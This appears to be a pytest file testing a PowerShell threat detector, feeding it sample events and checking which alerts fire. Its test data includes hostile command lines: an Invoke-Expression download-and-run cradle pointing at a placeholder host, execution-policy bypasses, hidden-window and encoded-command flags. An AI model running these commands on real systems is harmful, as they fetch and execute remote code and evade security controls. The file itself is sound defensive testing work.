from importlib import import_module


detector_module = import_module(
    "07_PowerShell_Threat_Detection.src.detector"
)

detect_threats = detector_module.detect_threats
analyze_event = detector_module.analyze_event


def make_event(host_application="", script_block=""):
    return {
        "host_application": host_application,
        "script_block": script_block,
    }


def test_detect_encoded_command():
    event = make_event(
        host_application="powershell.exe -EncodedCommand SQBFAFgA"
    )

    alerts = detect_threats(event)

    assert any(
        alert["rule_name"] == "Encoded PowerShell Command"
        for alert in alerts
    )


def test_detect_execution_policy_bypass():
    event = make_event(
        host_application="powershell.exe -ExecutionPolicy Bypass"
    )

    alerts = detect_threats(event)

    assert any(
        alert["rule_name"] == "Execution Policy Bypass"
        for alert in alerts
    )


def test_detect_hidden_window():
    event = make_event(
        host_application="powershell.exe -WindowStyle Hidden"
    )

    alerts = detect_threats(event)

    assert any(
        alert["rule_name"] == "Hidden PowerShell Window"
        for alert in alerts
    )


def test_detect_base64_decoding():
    event = make_event(
        script_block="[Convert]::FromBase64String($data)"
    )

    alerts = detect_threats(event)

    assert any(
        alert["rule_name"] == "Base64 Decoding"
        for alert in alerts
    )


def test_detect_remote_execution():
    event = make_event(
        script_block="Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/script')"
    )

    alerts = detect_threats(event)

    assert len(alerts) > 0


def test_benign_command_has_no_alerts():
    event = make_event(
        host_application="powershell.exe -NoProfile",
        script_block="Get-Process; Get-Service",
    )

    alerts = detect_threats(event)

    assert alerts == []


def test_analyze_event_marks_suspicious():
    event = make_event(
        host_application="powershell.exe -EncodedCommand ABCD"
    )

    result = analyze_event(event)

    assert result["is_suspicious"] is True
    assert len(result["alerts"]) > 0


def test_analyze_event_marks_benign():
    event = make_event(
        script_block="Get-Date"
    )

    result = analyze_event(event)

    assert result["is_suspicious"] is False
    assert result["alerts"] == []
def test_detect_set_execution_policy_bypass():
    event = make_event(
        script_block="Set-ExecutionPolicy Bypass -Scope Process"
    )

    alerts = detect_threats(event)

    assert any(
        alert["rule_name"] == "Execution Policy Bypass"
        for alert in alerts
    )